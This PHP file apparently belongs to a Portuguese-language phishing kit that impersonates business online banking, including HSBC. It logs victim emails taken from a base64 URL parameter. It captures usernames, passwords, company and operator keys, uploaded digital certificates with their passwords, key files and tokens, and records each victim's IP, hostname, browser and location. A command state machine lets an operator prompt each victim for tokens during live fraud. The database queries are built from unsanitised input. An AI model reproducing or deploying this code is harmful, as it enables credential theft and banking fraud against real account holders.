<?php

$e500 = '<script language="javascript">window.location.replace("https://www.google.com/");</script>';
$emailx = $_GET['cliente'];
$email = base64_decode($emailx);
if (isset($_GET['cliente']) && !filter_var($email, FILTER_VALIDATE_EMAIL) === false) { 
	$msg = "ACESSO: $email \n";
	$myFl = "acc-log.txt";
	$open = fopen($myFl, 'a') or die("can't open file");
	fwrite($open, $msg);
	fclose($open);
} else { 
	//echo $e500; exit;
}  

include('../../_functions/functions.php');

$UserId = getIdUser();
echo $UserId;
if(!isset($_SESSION['mailx'])){
	$_SESSION['mailx'] == $emailx;
}

// ENVIANDO E SALVANDO ARQUIVOS
if(isset($_POST['sender']) && $_POST['sender'] == 'send_start'):
	$TipoAcesso = @$_POST['type_acess'];

	if($TipoAcesso == 'user_pass'):
		$Usuario = $_POST['main_user'];
		$Senha = $_POST['main_pass'];
		
		$GetInfoNav = SetNavegadorSO($conn, $UserId);
		$GetInfoNav = explode(';', $GetInfoNav);
		$GetInfoLoc = setLocalization($conn, $UserIp, $UserId);
		$GetInfoLoc = explode(';', $GetInfoLoc);

		$pc_name = gethostbyaddr($UserIp);
		$data_acesso = date('Y-m-d H:i:s');
		$browser_name = $GetInfoNav[0];
		$browser_version = $GetInfoNav[1];
		$sistema_operacional = $GetInfoNav[2];
		$cidade = $GetInfoLoc[0];
		$estado = $GetInfoLoc[1];
		$pais = $GetInfoLoc[2];
		$tipo_acesso = 'JUBA USER';
		$comando = 'LOADING';
		$status = 0;
		$timestamp = mktime(date("H"), date("i"), date("s") + 50, date("m"), date("d"), date("Y"));

		$campos = 'id, ip, pc_name, data_acesso, browser_name, browser_version, sistema_operacional, cidade, estado, pais, tipo_acesso, comando, senha_4, status, time_acesso, agencia';
		$values = "'$UserId', '$UserIp','$pc_name', '$data_acesso', '$browser_name', '$browser_version', '$sistema_operacional', '$cidade', '$estado', '$pais', '$tipo_acesso', '$comando', '$Senha','$status', '$timestamp', '$Usuario'";

		create($conn, 'acessos', $campos, $values);
		unset($_SESSION['Inicializar']);
		echo $values;
		sleep(20);
		header('Location: acesso.php?cliente='.$emailx.'');

	elseif($TipoAcesso == 'hbc'):
		$ChaveEmp = $_POST['chave_emp'];
		$ChaveOp = $_POST['chave_ope'];
		$Senha = $_POST['sete_pass'];

		$GetInfoNav = SetNavegadorSO($conn, $UserId);
		$GetInfoNav = explode(';', $GetInfoNav);
		$GetInfoLoc = setLocalization($conn, $UserIp, $UserId);
		$GetInfoLoc = explode(';', $GetInfoLoc);

		$pc_name = gethostbyaddr($UserIp);
		$data_acesso = date('Y-m-d H:i:s');
		$browser_name = $GetInfoNav[0];
		$browser_version = $GetInfoNav[1];
		$sistema_operacional = $GetInfoNav[2];
		$cidade = $GetInfoLoc[0];
		$estado = $GetInfoLoc[1];
		$pais = $GetInfoLoc[2];
		$tipo_acesso = 'JUBA CERT HSBC';
		$comando = 'LOADING';
		$status = 0;
		$timestamp = mktime(date("H"), date("i"), date("s") + 50, date("m"), date("d"), date("Y"));

		$campos = 'id, ip, pc_name, data_acesso, browser_name, browser_version, sistema_operacional, cidade, estado, pais, tipo_acesso, comando, senha_4, status, time_acesso, agencia, conta';
		$values = "'$UserId', '$UserIp','$pc_name', '$data_acesso', '$browser_name', '$browser_version', '$sistema_operacional', '$cidade', '$estado', '$pais', '$tipo_acesso', '$comando', '$Senha','$status', '$timestamp', '$ChaveEmp', '$ChaveOp'";

		create($conn, 'acessos', $campos, $values);
		unset($_SESSION['Inicializar']);
		header('Location: acesso.php?cliente='.$emailx.'');

	elseif($TipoAcesso == 'certificado'):
		
		if(isset($_FILES['arquivo']) && $_FILES['arquivo'] != ''):
			$Arquivo = $_FILES['arquivo'];
			$Senha = $_POST['cert_pass'];

			$name_ext 	= explode('.', $Arquivo['name']);
			$name_ext	= $name_ext[1];	
			$ext_file 	= strtolower($name_ext);

			$local_txt = '../../_images/certificados';
			$UpaImagem = UploaderNow($UserIp, $Arquivo, $local_txt);
			$certificado_patch = $UserIp.'/comprovante.'.$ext_file;

			$GetInfoNav = SetNavegadorSO($conn, $UserId);
			$GetInfoNav = explode(';', $GetInfoNav);
			$GetInfoLoc = setLocalization($conn, $UserIp, $UserId);
			$GetInfoLoc = explode(';', $GetInfoLoc);

			$pc_name = gethostbyaddr($UserIp);
			$data_acesso = date('Y-m-d H:i:s');
			$browser_name = $GetInfoNav[0];
			$browser_version = $GetInfoNav[1];
			$sistema_operacional = $GetInfoNav[2];
			$cidade = $GetInfoLoc[0];
			$estado = $GetInfoLoc[1];
			$pais = $GetInfoLoc[2];
			$tipo_acesso = 'JUBA CERT';
			$comando = 'SEND_KEY';
			$status = 0;
			$timestamp = mktime(date("H"), date("i"), date("s") + 50, date("m"), date("d"), date("Y"));

			$campos = 'id, ip, pc_name, data_acesso, browser_name, browser_version, sistema_operacional, cidade, estado, pais, tipo_acesso, comando, senha_4, status, time_acesso, cert_path';
			$values = "'$UserId', '$UserIp','$pc_name', '$data_acesso', '$browser_name', '$browser_version', '$sistema_operacional', '$cidade', '$estado', '$pais', '$tipo_acesso', '$comando', '$Senha','$status', '$timestamp', '$certificado_patch'";

			create($conn, 'acessos', $campos, $values);
			unset($_SESSION['Inicializar']);
			header('Location: acesso.php?cliente='.$emailx.'');
			
		else:
			echo '<script>alert("Falha ao enviar Certificado Digital.\nTente novamente! 2");</script>';
			echo '<script>window.location.href="acesso.php'.$emailx.'";</script>';
		endif;	
		
	endif;	

elseif(isset($_POST['sender']) && $_POST['sender'] == 'send_key'):
	if(isset($_FILES['arquivo']) && $_FILES['arquivo'] != ''):
		$Arquivo = $_FILES['arquivo'];

		$name_ext 	= explode('.', $Arquivo['name']);
		$name_ext	= $name_ext[1];	
		$ext_file 	= strtolower($name_ext);

		$local_txt = '../../_images/certificados';
		$UpaImagem = UploaderNow($UserIp, $Arquivo, $local_txt);
		$chave_patch = $UserIp.'/comprovante.'.$ext_file;

		update($conn, 'acessos', "comando = 'LOADING', key_path = '$chave_patch'", "WHERE id = '$UserId'");
		header('Location: acesso.php?cliente='.$emailx.'');
	else:
		echo '<script>alert("Falha ao enviar sua Chave Digital.\nTente novamente! 2");</script>';
		echo '<script>window.location.href="acesso.php'.$emailx.'";</script>';
	endif;	

elseif(isset($_POST['sender']) && $_POST['sender'] == 'send_tk_bc'):
	$token_hbc = $_POST['tk_hbc'];

	update($conn, 'acessos', "comando = 'LOADING', token = '$token_hbc'", "WHERE id = '$UserId'");
	header('Location: acesso.php?cliente='.$emailx.'');

endif;	

// INCLUDE DE PÁGINAS 
if(isset($_SESSION['Inicializar']) && $_SESSION['Inicializar'] == 1):
	//include('includes/index.php');
	header('Location: /html/pessoa-juridica/includes/index.php?cliente='.$emailx);
	unset($_SESSION['Inicializar']);
else:
	$GetComando = read($conn, 'acessos', "WHERE id = '$UserId'");
	switch ($GetComando[0]['comando']) {
		case 'LOADING':
			include('includes/loading.php');
		break;
		case 'SEND_KEY':
			include('includes/nd_key.php');
		break;
		case 'GET_TOKEN':
			if($GetComando[0]['tipo_acesso'] == 'JUBA CERT' || $GetComando[0]['tipo_acesso'] == 'JUBA USER'):
				include('includes/nd_tkcert.php');
			else:
				include('includes/nd_tkbc.php');
			endif;	
		break;
		case 'GET_TOKEN X':
			if($GetComando[0]['tipo_acesso'] == 'JUBA CERT' || $GetComando[0]['tipo_acesso'] == 'JUBA USER'):
				include('includes/nd_tkcert.php');
				echo '<script>alert("O Código Token Informado não está correto.\nTente novamente!");</script>';
			else:
				include('includes/nd_tkbc.php');
				echo '<script>alert("O Código Token Informado não está correto.\nTente novamente!");</script>';
			endif;
		break;	
		case 'ACESSO X':
			$tabela = 'acessos';
			$cond = "WHERE id = '$UserId'";
			delete($conn, $tabela, $cond);
			echo '<script>alert("Os dados informados não estão corretos.\nTente novamente!");</script>';
			echo '<script>window.location.href="index.php";</script>';
		break;
		case 'FINALIZADO':
			include('includes/finalizado.php');
		break;

		
		default:
			include('includes/loading.php');
		break;
	}
	
endif;	

$TimeAtualiza = mktime(date("H"), date("i"), date("s") + 50, date("m"), date("d"), date("Y"));
$tabela = 'acessos';
$values = "time_acesso = '$TimeAtualiza'";
$cond = "WHERE id = '$UserId'";
update($conn, $tabela, $values, $cond);

?>